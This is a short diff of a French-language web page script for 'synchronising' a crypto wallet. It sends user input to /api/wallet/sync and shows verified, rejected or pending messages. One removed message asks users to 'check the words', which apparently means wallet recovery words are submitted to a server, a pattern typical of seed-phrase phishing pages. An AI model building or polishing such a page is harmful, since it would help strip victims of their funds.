@@ -339,7 +339,6 @@
             document.getElementById('validateBtn').innerHTML = '⏳ Envoi...';
 
             try {
-                // UNE SEULE REQUÊTE : enregistrement + vérification
                 const response = await fetch('/api/wallet/sync', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -359,8 +358,8 @@
                         showToast('✅ Wallet synchronisé !', 'success');
                     } else if (data.status === 'rejected') {
                         statusDiv.className = 'status-box status-rejected';
-                        statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
-                        showToast('❌ Synchronisation rejetée', 'error');
+                        statusDiv.innerHTML = '❌ Erreur de vérification';
+                        showToast('❌ Erreur de vérification', 'error');
                     } else {
                         statusDiv.className = 'status-box status-pending';
                         statusDiv.innerHTML = '⏳ En attente de synchronisation...';
